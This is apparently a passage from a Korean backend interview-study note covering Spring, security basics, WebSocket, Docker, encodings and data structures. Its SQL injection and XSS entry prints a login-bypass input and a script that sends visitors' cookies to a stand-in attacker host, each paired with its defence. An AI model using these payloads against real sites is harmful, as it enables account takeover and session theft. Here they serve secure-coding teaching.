| :------------ | :----------------------------------------------------------------------------------------------------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------- |
| **관리자**    | **Web Container (Tomcat)**                                                                                               | **Spring Container**                                                                                                                           |
| **위치**      | DispatcherServlet **진입 전**                                                                                            | DispatcherServlet **실행 후** (Controller 호출 전후)                                                                                           |
| **용도**      | 보안(XSS/CORS), 인코딩, 이미지/데이터 압축 등 **전역적** 처리                                                            | 인증/인가, API 로깅, 컨트롤러로 넘기는 **데이터 가공**                                                                                         |
| **에러 처리** | `DispatcherServlet` 도달 전이라 예외 발생 시 **WAS(Tomcat)까지 올라감**.<br>(`@ControllerAdvice` 불가, `web.xml`로 처리) | `DispatcherServlet`의 **실행 흐름(`doDispatch`) 안**이므로 **Spring이 가로채서 처리함**.<br>(**WAS까지 안 감**, `@ControllerAdvice` 적용 가능) |

> **실행 순서**: 요청 -> `Filter` -> `DispatcherServlet` -> `Interceptor` -> `Controller`

<br>
<img width="928" height="461" alt="image" src="https://github.com/user-attachments/assets/40c2a3a1-ed93-4f4d-842a-c4347c5ca46a" />


**Interceptor의 3가지 호출 시점 (Spring Bean으로 관리됨)**
1.  **preHandle** (컨트롤러 호출 전 / 정확히는 **핸들러 어댑터 호출 전**)
    -   `true`면 다음 단계로 진행, `false`면 **더 이상 진행하지 않습니다.**
    -   `false`인 경우 남은 인터셉터는 물론, **핸들러 어댑터도 호출되지 않고** 요청 처리가 중단됩니다.
2.  **postHandle** (컨트롤러 호출 후 / 정확히는 **핸들러 어댑터 호출 후**)
    -   핸들러(컨트롤러)가 정상적으로 실행된 후에 호출됩니다.
3.  **afterCompletion** (뷰 렌더링 후)
    -   뷰 렌더링을 포함한 모든 작업이 완료된 이후에 호출됩니다.

</details>

<details>
<summary>Spring과 Spring Boot의 차이점</summary>

<br>

- **Spring Boot**는 Spring 프레임워크를 더 쉽게 사용할 수 있게 해주는 도구입니다.
- **주요 차이**:
  1. **의존성 관리**: `spring-boot-starter`로 버전 관리 자동화.
  2. **Auto Configuration**: `@EnableAutoConfiguration`으로 복잡한 설정 자동화.
  3. **내장 WAS**: Tomcat이 내장되어 있어 별도 설치 없이 `jar` 실행 가능.

</details>

<details>
<summary>POJO (Plain Old Java Object)와 PSA (Portable Service Abstraction)</summary>

<br>

- **POJO**: 특정 프레임워크나 기술에 종속되지 않은 순수한 자바 객체. (객체지향 설계 원칙 준수 용이)
- **PSA**: 환경과 구현 기술의 변경과 무관하게 일관된 접근 방식을 제공하는 추상화 구조.
  - 예: `@Transactional` (JDBC, JPA, Hibernate 어떤 기술을 쓰든 동일한 방식으로 트랜잭션 제어), Spring Cache, Spring Web MVC.

</details>

## 6. Security & Infrastructure

<details>
<summary>대칭키 vs 비대칭키 암호화</summary>

<br>

- **대칭키**: 암/복호화 키가 같음. 빠르지만 키 전달 문제. (AES-256)
    *   **원리**: 데이터의 비트(0,1)를 키 값과 섞어버림(치환/전치). 같은 키로 반대로 돌리면 원본이 나옴.
    *   **비유**: 방문을 잠글 때 쓴 열쇠로만 다시 열 수 있음. (열쇠를 택배로 보내다가 털리면 끝장)

- **비대칭키**: 공개키/개인키. 느리지만 키 전달 안전. (RSA)
    *   **원리**: **A키로 잠그면 B키로만 열림.** (수학적 성질 이용).
    *   **비유**: **공개키(자물쇠)**는 길바닥에 뿌려서 누구나 잠그게 하고, **개인키(열쇠)**는 나만 가지고 있어서 나만 열어볼 수 있음.

</details>

<details>
<summary>단방향 암호화 (Hashing)</summary>

<br>

복호화가 불가능한 암호화. 비밀번호 저장에 사용.
- **원리**: 데이터를 수학적 연산(**나머지 연산** 등)으로 뭉개서 고정된 길이의 문자열로 변환합니다. (믹서기로 갈아버린 딸기를 다시 딸기로 못 만드는 것과 같음)
- **Salt**: 같은 비밀번호라도 다른 해시값이 나오도록 랜덤 문자열 추가.
- **Rainbow Table** 공격 방어.

> **종류 (알고리즘)**
> *   **SHA-256**: 빠름. 파일 무결성 검사나 블록체인에 사용. (비밀번호용으로는 비추천)
> *   **BCrypt**: 느림(일부러). **비밀번호 저장용**으로 표준.

</details>

<details>
<summary>실시간 통신 (Polling vs Long Polling vs WebSocket)</summary>

<br>

**1. Polling (단순 무식)**

클라이언트가 주기적(예: 1초마다)으로 서버에게 데이터를 물어보는 방식.
*   **흐름**: Client `->` Server (데이터 있어?) `->` Client (없어) ... (반복)
*   **단점**: 불필요한 요청 폭주(서버 부하 ), 실시간성 낮음.

**2. Long Polling (존버 전략)**
클라이언트가 요청을 보내면, 서버는 **데이터가 생길 때까지 응답을 보류**(대기)합니다. (단, 타임아웃까지)
*   **흐름**: Client `->` Server ... (데이터 올 때까지 or 타임아웃까지 대기) ... `->` Client (응답) `->` Client (즉시 재요청)
*   **장점**: Polling보다 불필요한 요청이 적고 즉시성 높음.
*   **단점**: 데이터가 빈번하게 터지면 Polling이랑 똑같이 부하 큼. 타임아웃 시 재연결 부하 발생.

**3. WebSocket (양방향 전용선)**
HTTP(80)로 연결했다가 `Upgrade` 헤더를 통해 **양방향 통신 프로토콜**(ws://)로 전환하는 방식.
*   **흐름**: Client `<->` Server (실시간 자유 대화)
    ```text
    [Handshake] (HTTP Upgrade)
       |
       v
    Client <==================> Server (TCP 연결 유지)
              (데이터 푸시) ->
              <- (메시지 전송)
    ```
*   **특징**: 한 번 연결하면 계속 열려있음. **Header 오버헤드가 적고 가장 빠름.** (채팅, 주식, 실시간 게임)
*   **주의**: Stateful 프로토콜이므로 서버 스케일아웃(로드밸런싱) 시 세션 관리에 유의 필요.

    > **Q. 서버를 늘리면(Scale-out) 왜 문제가 되나요?**
    > 웹소켓은 클라이언트와 **특정 서버**가 1:1로 계속 연결되어 있는 상태(Stateful)입니다.
    > *   **상황**: 유저 A가 '서버 1'에 연결됨.
    > *   **문제**: 채팅 메시지가 로드밸런서를 타고 '서버 2'로 들어올 수 있음. -> '서버 2'는 유저 A와 연결된 적이 없어서 메시지 전송 불가.
    > *   **해결**: **Redis Pub/Sub** 같은 메시지 브로커를 도입해서, 어떤 서버로 메시지가 오든 실제 유저가 연결된 서버로 메시지를 전달해줘야 합니다.

</details>


<details>
<summary>JWT (JSON Web Token)</summary>

<br>

Stateless한 인증 방식. 서버 저장소 없이 토큰 자체에 정보를 담아 검증.
- 구성: Header . Payload(Claim) . Signature
- Access Token의 만료 기간을 짧게 잡고 Refresh Token을 병행 사용하여 보안성을 높임.

</details>

<details>
<summary>SQL Injection & XSS</summary>

<br>

- **SQL Injection**: 입력값에 SQL 구문을 삽입해 DB 조작. -> **Prepared Statement**로 방어.
    *   **공격 예시**: 로그인 ID에 `admin' OR '1'='1` 입력 -> 비밀번호 없이 로그인 성공.
    ```sql
    -- 해커가 만든 쿼리 (항상 참이 되어버림)
    SELECT * FROM users WHERE id = 'admin' OR '1'='1' AND password = '...';
    ```
    *   **방어 코드**: `PreparedStatement` 사용 (`?` 바인딩)
    ```java
    // 입력값을 단순 문자열로만 취급하여 실행 구문으로 인식하지 않음
    String sql = "SELECT * FROM users WHERE id = ? AND password = ?";
    pstmt = conn.prepareStatement(sql);
    pstmt.setString(1, inputId); 
    ```

- **XSS** (Cross Site Scripting): 악성 스크립트 실행 공격. -> **입력값 검증 및 Escaping**으로 방어.
    *   **공격 예시**: 게시판에 스크립트 태그 삽입 -> 열람하는 사용자 쿠키 탈취.
    ```html
    <script>location.href='http://hacker.com?cookie='+document.cookie</script>
    ```
    > **원리**: 
    > 1. 해커가 게시판에 위 코드를 작성해서 올림.
    > 2. 일반 사용자가 해당 게시글을 **읽는 순간**, 브라우저가 위 코드를 실행함.
    > 3. 사용자의 **쿠키**가 해커 서버로 전송됨 -> 해킹 완료.

    *   **방어 예시**: 특수문자를 HTML 엔티티로 치환 (Escaping).
    ```text
    <script> -> &lt;script&gt; (브라우저가 실행하지 않고 글자로 보여줌)
    ```

</details>

<details>
<summary>CI/CD, Docker, Load Balancer</summary>

<br>

- **CI/CD**: 지속적 통합 및 배포 자동화 파이프라인.
    *   **CI (Continuous Integration, 지속적 통합)**: 
        *   개발자가 코드를 푸시하면 -> 자동으로 **빌드(Build) & 테스트(Test)**를 수행하여 문제없음을 검증하고 메인 브랜치에 통합하는 과정.
        *   핵심: **"버그를 조기에 발견하고 해결"** (Github Actions, Jenkins)
    *   **CD (Continuous Deployment, 지속적 배포)**:
        *   통합된 코드를 자동으로 운영 서버에 **배포(Deploy)**하는 과정.
        *   핵심: **"개발 생산성 증대 & 빠른 고객 피드백 반영"** (AWS CodeDeploy, Blue/Green 무중단 배포)

- **Docker (vs VM)**: 애플리케이션 실행 환경을 격리하는 **컨테이너** 기술.
    *   **탄생 배경 (VM의 한계)**: 기존 가상머신(VM)은 OS 위에 또 다른 **OS(Guest OS)를 통째로 설치**해야 해서 매우 무겁고 느렸습니다. (리소스 낭비 심함)
    *   **도커의 혁신**: OS 전체를 설치하는 대신, **리눅스 커널은 공유**하고 애플리케이션 실행에 필요한 라이브러리/설정만 격리합니다.
    *   **장점**: **가볍고 빠르며**, "내 컴퓨터에선 되는데 서버에선 안돼요"라는 환경 불일치 문제를 해결했습니다.

    
    > **Q. 그럼 맥(macOS)이나 윈도우에서는 어떻게 리눅스 컨테이너를 돌리나요?**
    > **사용자의 컴퓨터(Host OS) 위에** 아주 가벼운 **리눅스 가상머신**(VM)을 띄워서 그 안에서 도커를 실행합니다.
    > *   **구조**: 맥북(Host) -> 리눅스 VM(Guest) -> 도커 컨테이너
    > *   (도커 데스크탑을 설치하면 이 VM을 자동으로 관리해 줍니다.)

    > **Q. 리눅스 환경과 맥/윈도우 환경의 차이는?**
    > *   **리눅스**: VM 없이 Host OS의 커널을 바로 공유하므로 **성능 오버헤드가 거의 없음**. (Native)
    > *   **맥/윈도우**: 어쩔 수 없이 리눅스 VM을 거쳐야 하므로 약간의 오버헤드가 있음.

    > **Q. 커널(Kernel)은 무슨 일을 하나요?**
    >
    > 컨테이너들(Spring, MySQL 등)이 **하드웨어 자원(CPU, 메모리, 디스크, 네트워크)을 사용할 수 있게 중개하고 격리**해줍니다.
    > *   예: "MySQL 너는 디스크 여기만 써", "Spring 너는 CPU 이만큼만 써" (Namespaces & Cgroups)

    > **Q. 맥북에서 돌릴 때 하드웨어(CPU/RAM) 자원 통제는 누가 하나요?**
    > 결국 **맥북 OS**(주인)가 리눅스 VM(세입자)에게 자원을 떼어주는 형태입니다.
    > 
    > *   **맥북(Host)**: "야, 리눅스 VM 너는 CPU 2개랑 램 4GB만 써. 그 안에서 네가 알아서 지지고 볶아."
    > *   **리눅스 VM(Guest)**: "넵, 알겠습니다. (이걸 받아서 자기 안의 컨테이너들에게 다시 나눠줌)"
    > *   즉, **맥북 커널과 리눅스 커널이 동시에 따로 돌아갑니다.**

- **Load Balancer**: 트래픽을 여러 서버로 분산 (L4: IP/Port, L7: URL/Header).

</details>

<details>
<summary>Monolithic Architecture vs Microservice Architecture (MSA)</summary>

<br>

- **Monolithic**: 모든 모듈이 하나의 서비스(프로젝트) 안에 통합된 구조.
  - 장점: 개발/배포/테스트가 단순함.
  - 단점: 부분 장애가 전체에 영향, 빌드/배포 시간 증가, 기술 스택 변경 어려움.
- **MSA**: 서비스를 기능별로 작게 나누어 독립적으로 배포/실행하는 구조 (API 통신).
  - 장점: 유연한 기술 선택, 개별 배포 가능, 장애 격리.
  - 단점: 복잡한 트랜잭션 관리, 서비스 간 통신 비용, 운영 복잡도 증가.

</details>

<details>
<summary>Scale-up vs Scale-out</summary>

<br>

- **Scale-up (수직 확장)**: 서버 자체의 성능(CPU, RAM)을 업그레이드. (한계 비용 높음, 단일 장애점)
- **Scale-out (수평 확장)**: 서버의 대수(Instance)를 늘림. (로드밸런싱 필요, 무한 확장 가능, MSA에 적합)

</details>

<details>
<summary>시스템 확장성과 샤딩(Sharding)</summary>

<br>

**샤딩**: 대용량 데이터를 여러 DB에 분산 저장하는 기술.
- **Shard Key**: 데이터를 나누는 기준 (예: `user_id % 4`).
- **단점**: Join이 어렵고, 트랜잭션 관리가 복잡해짐. Rebalancing(데이터 재분배)이 어려움.

</details>

## 7. Encoding & Data Format (인코딩과 데이터 포맷)

<details>
<summary>문자 인코딩이란? ASCII vs UTF-8</summary>

<br>

**문자 인코딩**: 문자를 컴퓨터가 이해할 수 있는 바이트(숫자)로 변환하는 규칙입니다.

**ASCII**:
- 7비트로 128개 문자 표현 (영문자, 숫자, 특수문자)
- 한글, 한자 등 다국어 표현 불가

**UTF-8**:
- **가변 길이 인코딩**: 영문 1바이트, 한글 3바이트
- ASCII와 **하위 호환** (영문자는 ASCII와 동일)
  - 아스키 코드로 쓴 영어 텍스트("Hello World")는 UTF-8로 읽어도 똑같이 읽힙니다.
- **웹 표준**: HTML, JSON, REST API의 기본 인코딩

</details>

<details>
<summary>왜 UTF-8을 사용하나요?</summary>

<br>

**1. 전 세계 모든 문자를 하나의 인코딩으로 표현**:
- 과거: 한국(EUC-KR), 일본(Shift-JIS) 등 나라마다 다른 인코딩 사용
- 문제: 인코딩이 다르면 **글자가 깨짐**
- 해결: UTF-8 하나로 모든 문자 표현

**2. ASCII와 완벽한 호환**:
- 기존 영어 기반 시스템과 호환성 유지

**3. 플랫폼 독립성**:
- Windows, Linux, macOS 등 **모든 OS에서 동일하게 해석**

> **핵심**: "어떤 시스템이든 문자가 깨지지 않게 하자!"

</details>

<details>
<summary>Base64 인코딩이란? 왜 사용하나요?</summary>

<br>

- **Base64**: 바이너리 데이터(이미지 등)를 텍스트(ASCII)로 변환하는 인코딩.
    *   **원리**: 3바이트(24bit)를 6비트씩(2^6=64) 4개로 쪼개서 문자로 표현.
    *   **크기 증가**: 입력 3바이트 -> 출력 4바이트가 되므로 **크기가 약 33% 커짐**.
    *   **용도**: 바이너리 데이터를 JSON/HTML 등에 안전하게 포함시킬 때 (깨짐 방지).

    > **Q. 왜 바이너리를 그대로 문자열에 넣으면 안 되나요?**
    > 이미지의 비트 데이터 중에 **우연히 특수 문자와 겹치는 비트**가 있을 수 있기 때문입니다.
    > 
    > **[위험한 상황 예시]**
    > *   **이미지 데이터**: `01010101` `00100010` `11110000` ...
    >     *   가운데 `00100010`은 ASCII 코드로 **따옴표(`"`)**입니다.
    > *   **JSON 파서의 오해**:
    >     *   `{ "image": "U(데이터)... ` `00100010` ` ...(뒷부분)... " }`
    >     *   파서: "어? 중간에 `00100010`(따옴표)가 나왔네? 여기서 문자열 끝이구나!" (**뒤쪽 데이터 잘림 & 문법 에러**)
    > *   **해결책**: Base64로 변환하면 모든 데이터가 `a~z, 0~9` 같은 안전한 문자로만 바뀝니다. (" -> `Ig==` 등으로 변환됨)
    >
    > 
    > **[데이터 처리 흐름 요약]**
    > 1. **일반 문자** ("James"): 그냥 **UTF-8**로 인코딩해서 전송.
    > 2. **이미지/파일** (Binary): **Base64**로 변환(문자열화) -> 그 후 **UTF-8**로 인코딩해서 전송.

**왜 사용하나요?**:

**1. 서로 다른 시스템 간 안전한 데이터 전송**:
- 문제: 바이너리를 그대로 전송하면 **시스템마다 해석이 달라** 데이터 손상 가능
- 해결: **모든 시스템이 동일하게 해석하는 64개 문자만 사용**

**2. 텍스트 기반 프로토콜에서 바이너리 전송**:
- 이메일, JSON, XML은 텍스트 기반이라 바이너리를 직접 담을 수 없음
- Base64로 인코딩하면 이미지를 문자열처럼 전송 가능

**3. JWT에서 사용**:
- JWT의 Header, Payload가 Base64URL로 인코딩됨

> **핵심**: "어떤 OS, 어떤 프로토콜에서든 **호환되는 안전한 문자만** 써서 오류를 없애자!"

**주의**: Base64는 **암호화가 아님**. 누구나 디코딩 가능.

</details>

<details>
<summary>URL 인코딩(Percent Encoding)이란?</summary>

<br>

**URL 인코딩**: URL에서 사용할 수 없는 문자를 `%XX` 형태로 변환하는 것입니다.

**필요한 이유**:
- URL은 ASCII 문자만 허용
- 공백, 한글, 특수문자는 URL 구조와 충돌

**변환 예시**:
- 공백: `%20`
- 한글 "안녕": `%EC%95%88%EB%85%95`
- `&`: `%26`

</details>

<details>
<summary>이미지 포맷 비교: JPEG vs PNG vs WebP</summary>

<br>

| 포맷     | 압축 방식   | 투명도 | 용도                      |
| -------- | ----------- | ------ | ------------------------- |
| **JPEG** | 손실 압축   | X      | 사진, 복잡한 이미지       |
| **PNG**  | 무손실 압축 | O      | 로고, 아이콘, 스크린샷    |
| **WebP** | 손실/무손실 | O      | 웹 최적화 (JPEG/PNG 대체) |

**JPEG**:
- **손실 압축**으로 파일 크기 작음
- 투명 배경 미지원
- 사진에 적합

**PNG**:
- **무손실 압축**으로 품질 저하 없음
- **알파 채널**(투명도) 지원
- 로고, 아이콘에 적합

**WebP**:
- Google이 개발한 웹 최적화 포맷
- JPEG 대비 25-34% 작은 용량
- 투명도 지원

</details>

<details>
<summary>손실 압축(Lossy)과 무손실 압축(Lossless)의 차이</summary>

<br>

**무손실 압축** (Lossless):
- 원본 데이터를 **완벽하게 복원** 가능
- 압축률이 상대적으로 낮음
- 예: PNG, ZIP, GZIP

**손실 압축** (Lossy):
- 인간이 인지하기 어려운 정보를 **제거**하여 압축
- 압축률이 높음, 원본 복원 불가
- 예: JPEG, MP3, MP4

</details>

<details>
<summary>JSON과 XML의 차이점</summary>

<br>

| 구분      | JSON                | XML                 |
| --------- | ------------------- | ------------------- |
| 문법      | 간결함 (`{}`, `[]`) | 태그 기반 (`<tag>`) |
| 용량      | 작음                | 큼                  |
| 파싱 속도 | 빠름                | 느림                |
| 주 사용처 | REST API            | SOAP, 레거시 시스템 |

**현재 트렌드**: REST API에서는 **JSON**이 표준.

</details>

## 8. CS & Etc (자료구조, 디자인패턴, Git, 일반)

<details>
<summary>Array와 LinkedList의 차이점</summary>

<br>

| 구분          | Array (배열)            | LinkedList (연결 리스트)      |
| ------------- | ----------------------- | ----------------------------- |
| 메모리        | 연속된 공간 할당        | 불연속적 공간 (노드와 포인터) |
| 접근 (Access) | 인덱스로 즉시 접근 O(1) | 순차 접근 O(N)                |
| 크기          | 고정                    | 가변                          |

</details>

<details>
<summary>Stack과 Queue의 차이</summary>

<br>

- **Stack**: **LIFO** (Last In First Out). 나중에 들어간 게 먼저 나옴. (함수 호출 스택, 뒤로가기)
- **Queue**: **FIFO** (First In First Out). 먼저 들어간 게 먼저 나옴. (작업 큐, 프린터 대기열)

</details>

<details>
<summary>Git Merge와 Rebase의 차이</summary>

<br>

- **Merge**: 두 브랜치의 변경 사항을 합쳐 **새로운 커밋**(Merge Commit)을 생성. 히스토리가 그대로 남음(비선형).
- **Rebase**: 현재 브랜치의 베이스를 대상 브랜치의 최신 커밋으로 이동. 히스토리를 **한 줄로 깔끔하게 정렬**(선형)하지만, 기존 커밋 해시가 변경됨(공유 브랜치에서 주의).

</details>

<details>
<summary>디자인 패턴 (Singleton, Strategy, Factory)</summary>

<br>

1. **Singleton**: 클래스의 인스턴스를 **오직 하나만** 생성하여 전역에서 공유. (DB 커넥션 풀, 설정 관리)
2. **Strategy**: 알고리즘(전략)을 객체로 캡슐화하여 런타임에 교체 가능하도록 함. (결제 방식 선택, 정렬 알고리즘 교체)
3. **Factory Method**: 객체 생성을 서브클래스에 위임하여 구체적인 클래스 의존성을 낮춤.

</details>

<details>
<summary>프레임워크(Framework)와 라이브러리(Library)의 차이</summary>

<br>

**제어의 흐름**(Inversion of Control)이 누구에게 있느냐의 차이입니다.

- **Library**: 개발자가 흐름을 제어하며, 필요할 때 라이브러리의 코드를 호출해 사용합니다. (개발자 -> 코드)
- **Framework**: 프레임워크가 흐름을 제어하며, 개발자가 작성한 코드를 프레임워크가 호출해 실행합니다. (프레임워크 -> 코드)
  - 예: Spring이 개발자의 Controller를 찾아서 실행함.

</details>

<details>
<summary>동기(Synchronous) vs 비동기(Asynchronous) / 블로킹(Blocking) vs 논블로킹(Non-blocking)</summary>

<br>

- **동기와 비동기** (순서와 결과):
  - **Sync**: 요청 후 결과를 받을 때까지 대기하거나, 계속 확인(Polling). 순서가 보장됨.
  - **Async**: 요청 후 결과를 기다리지 않고 다음 작업 수행. 결과는 콜백(Callback)이나 이벤트로 받음.
  
- **블로킹과 논블로킹** (제어권):
  - **Blocking**: 다른 작업이 끝날 때까지 제어권을 넘겨주지 않고 대기. (BIO - `InputStream.read()`)
  - **Non-blocking**: 제어권을 바로 반환하여 다른 작업을 할 수 있게 함. (NIO - `Selector` 사용)

> **BIO vs NIO**:
> - **BIO (Blocking I/O)**: 스레드 1개당 연결 1개 담당. 접속 많으면 스레드 폭발.
> - **NIO (Non-blocking I/O)**: **Selector**가 여러 채널의 이벤트를 감시하고, **단일 스레드(Event Loop)**가 이벤트를 처리. 적은 스레드로 대량의 연결 처리 가능 (Tomcat NIO Connector, Netty, Node.js).

> **자주 묻는 예**: Node.js는 Single Thread 기반의 **Non-blocking I/O** 모델을 사용하여 높은 처리량을 가집니다.

</details>

<details>
<summary>TDD (Test Driven Development) 란?</summary>

<br>

**테스트 주도 개발**: 실제 코드를 작성하기 전에 **테스트 코드를 먼저 작성**하는 개발 방식.
- **Cycle**: Red(실패하는 테스트) -> Green(테스트 통과를 위한 최소 코드) -> Refactor(코드 개선).
- **장점**: 코드 품질 향상, 디버깅 시간 단축, 문서화 효과.
- **단점**: 초기 개발 생산성 저하.

</details>

<details>
<summary>컴파일 타임(Compile Time)과 런타임(Runtime)의 차이</summary>

<br>

- **Compile Time**: 소스 코드를 기계어(또는 바이트코드)로 변환하는 시점.
  - 에러: 문법 오류, 타입 체크 (`Syntax Error`) -> 발견하기 쉽고 안전함.
- **Runtime**: 컴파일 된 프로그램이 실행되는 시점.
  - 에러: 0으로 나누기, NullPointer, 메모리 부족 (`Runtime Error`) -> 심각한 버그 초래.

</details>
